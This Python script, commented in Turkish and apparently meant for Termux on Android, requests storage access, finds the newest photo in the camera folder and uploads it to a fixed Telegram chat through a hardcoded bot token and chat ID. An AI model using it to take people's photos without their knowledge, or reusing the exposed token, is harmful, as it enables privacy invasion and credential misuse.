import os
import requests
import time
import glob

# Telegram Bilgileri
TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

def send_telegram_photo(photo_path):
    """Belirtilen fotoğrafı Telegram'a gönderir."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("✅ Fotoğraf başarıyla gönderildi!")
            else:
                print(f"❌ Telegram hata verdi: {response.json()}")
        except Exception as e:
            print(f"⚠️ Fotoğraf gönderme hatası: {e}")

# 📌 Termux depolama izni al
os.system("termux-setup-storage")
time.sleep(2)  # Yetki alması için bekle

# 📌 Depolama dizinini belirle (Android 11+ için güvenli yol)
storage_path = "/data/data/com.termux/files/home/storage/dcim"

# 📌 Galerideki en son çekilmiş fotoğrafı bul
photo_list = sorted(
    glob.glob(f"{storage_path}/**/*.jpg", recursive=True) + 
    glob.glob(f"{storage_path}/**/*.png", recursive=True) +
    glob.glob(f"{storage_path}/**/*.jpeg", recursive=True),
    key=os.path.getctime,  # 📌 Dosya oluşturma tarihine göre sırala
    reverse=True  # 📌 En yeni fotoğraf en başta olsun
)

if photo_list:
    last_photo = photo_list[0]
    print(f"📷 Gönderilecek fotoğraf: {last_photo}")
    send_telegram_photo(last_photo)
else:
    print("⚠️ Galeri boş veya erişim izni yok.")
